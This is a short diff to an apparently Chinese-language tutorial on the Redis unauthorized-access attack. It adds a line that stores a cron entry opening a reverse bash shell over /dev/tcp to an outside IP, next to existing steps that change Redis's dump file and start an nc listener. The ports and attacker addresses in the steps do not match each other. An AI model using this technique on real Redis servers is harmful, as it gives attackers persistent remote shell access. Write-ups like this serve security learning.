@@ -44,6 +44,8 @@ redis 192.168.242.134:6379> config set dbfilename root
 redis 192.168.242.134:6379> save
 ```
 
+set x "\n* * * * * bash -i >& /dev/tcp/192.168.12.47/2345 0>&1\n"
+
 然后在攻击机（192.168.242.131）上启动 nc 监听 888端口，等待反弹shell。这过程需要一些时间。
 ```
 nc -lvnp 888
